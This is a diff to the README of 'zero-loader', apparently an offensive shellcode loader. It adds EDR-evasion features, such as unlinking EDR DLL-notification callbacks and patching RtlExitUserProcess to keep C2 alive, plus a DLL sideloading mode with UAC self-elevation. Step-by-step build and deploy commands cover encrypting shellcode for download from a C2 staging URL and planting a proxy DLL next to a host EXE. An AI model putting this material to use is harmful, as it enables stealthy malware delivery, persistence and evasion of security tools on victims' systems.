@@ -43,6 +43,8 @@ Most loaders get flagged because they ship the same binary. **zero-loader** rege
 | **Call Stack Spoofing** | `call rbx` gadget in ntdll + thread pool trampoline. All frames resolve to legitimate modules |
 | **Anti-Analysis** | PEB debugger flag, NtGlobalFlag, CPU count, RDTSC timing delta |
 | **IAT Camouflage** | Dead-code benign imports the optimizer cannot eliminate |
+| **Blind DLL Notifications** | Walks and unlinks all EDR `LdrRegisterDllNotification` callbacks — subsequent `LoadLibrary` invisible |
+| **Exit Hook** | Patches `RtlExitUserProcess` with PAUSE loop — prevents host exit from killing C2 (DLL sideload) |
 | **Post-Exec Cleanup** | Removes VEH, clears DR0/DR1/DR7 via `NtContinue`, wipes keys/URLs/nonces before shellcode execution |
 
 > **Crypto & Staging**
@@ -56,6 +58,16 @@ Most loaders get flagged because they ship the same binary. **zero-loader** rege
 | **HTTPS Staging** | Dynamic WinINet + `InternetCrackUrlA` + self-signed cert bypass |
 | **W^X Memory** | `PAGE_EXECUTE_READ` default. `RWX_SHELLCODE` flag for Go-based implants |
 
+> **DLL Sideloading**
+
+| | |
+|:--|:--|
+| **Export Forwarding** | Auto-generated linker pragmas — PE loader handles all legitimate API calls natively |
+| **Version Info Cloning** | Extracts and reproduces `VS_VERSIONINFO` from target DLL |
+| **Process Persistence** | `RtlExitUserProcess` patch + `LdrAddRefDll` pin — DLL survives host exit |
+| **Optional UAC** | `uac` build flag enables self-relaunch elevation via `ShellExecuteA("runas")` |
+| **Loader Lock Safe** | DllMain uses ntdll-only APIs; loader pipeline deferred to thread pool |
+
 <br/>
 
 ## Quick Start
@@ -65,24 +77,51 @@ Most loaders get flagged because they ship the same binary. **zero-loader** rege
 python Encrypt.py payload.bin --url https://<C2>:<PORT>/payload.dat
 
 # 2  Build
-build.bat
+build.bat                                  # EXE
+build.bat uac                              # EXE with UAC manifest
 
-# 3  Deploy — upload data.enc to staging server, deliver the exe
+# 3  Deploy — upload data.enc to staging server, deliver the EXE
 ```
 
 > Re-run steps 1 & 2 for a completely new binary.
+
+<details>
+<summary><b>DLL Sideloading</b></summary>
+
+<br/>
+
+```bash
+# 1  Generate export forwarding
+python SideloadGen.py C:\Windows\System32\<target>.dll
+
+# 2  Encrypt shellcode
+python Encrypt.py payload.bin --url https://<C2>:<PORT>/payload.dat
+
+# 3  Build
+build.bat sideload <target>.dll            # no UAC
+build.bat sideload <target>.dll uac        # self-relaunch UAC
+
+# 4  Deploy
+#    Rename real <target>.dll → <target>_orig.dll
+#    Place proxy <target>.dll + <target>_orig.dll alongside host EXE
+#    Upload data.enc to staging server, run host EXE
+```
+
+</details>
 
 <details>
 <summary><b>Build Flags</b></summary>
 
 <br/>
 
-Edit `Common.h`:
+Edit `Common.h` or pass via `build.bat`:
 
 | Flag | Default | Purpose |
 |:-----|:--------|:--------|
 | `DEBUG` | Off | Logging to `debug.log`, skips anti-analysis |
 | `RWX_SHELLCODE` | Off | `PAGE_EXECUTE_READWRITE` for Go/Sliver |
+| `BUILD_DLL` | Off | DLL sideload build (set by `build.bat sideload`) |
+| `REQUIRE_ELEVATION` | Off | Self-relaunch UAC for DLL sideload (`build.bat sideload ... uac`) |
 
 </details>
 
@@ -126,6 +165,22 @@ Main()
  ├─ SetSpoofTarget             configure ASM trampoline
  ├─ TpAllocWork / TpPostWork   thread pool execution
  └─ NtDelayExecution           keep-alive via indirect syscall
+```
+
+### DLL Sideload Flow
+
+```
+Host EXE loads proxy DLL → DllMain
+ │
+ ├─ PEB walk → find ntdll
+ ├─ InstallExitHook            patch RtlExitUserProcess (PAUSE loop)
+ ├─ TpAllocWork(SideloadWorker) → TpPostWork → return TRUE
+ │   [Host app continues, ExitProcess blocked]
+ │
+ └─ SideloadWorker (thread pool)
+     ├─ [uac] IsElevated? → no: ShellExecuteA "runas" → terminate self
+     ├─ LdrAddRefDll           pin DLL in memory
+     └─ Main()                 full loader pipeline
 ```
 
 ### Call Stack
@@ -175,6 +230,10 @@ Staging.c           HTTPS staging · cert bypass
 Common.h            defines · hashes · typedefs · macros
 Structs.h           undocumented NT structures
 Payload.h           auto-generated (never edit)
+Sideload.c          DLL entry point · exit hook · elevation
+SideloadGen.py      export forwarding generator · version info cloning
+Sideload.h          auto-generated export forwards (never edit)
+Sideload.rc         auto-generated version info (never edit)
 Encrypt.py          encryption + compression + obfuscation
 Mutate.py           post-build PE metadata randomizer
 build.bat           ml64 → cl → Mutate.py
